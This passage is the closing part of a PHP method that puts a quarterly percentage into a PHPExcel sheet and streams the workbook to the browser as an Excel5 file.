    			$objExcel->getSheet(0)->setCellValueByColumnAndRow(7,17,number_format($this->quarterlytotal['totalall']/$this->quarterly['total']['total']*100,0)."%");
    			
    			$objWriter = new PHPExcel_Writer_Excel5($objExcel);
    			$objWriter->save('php://output');
    
    }
}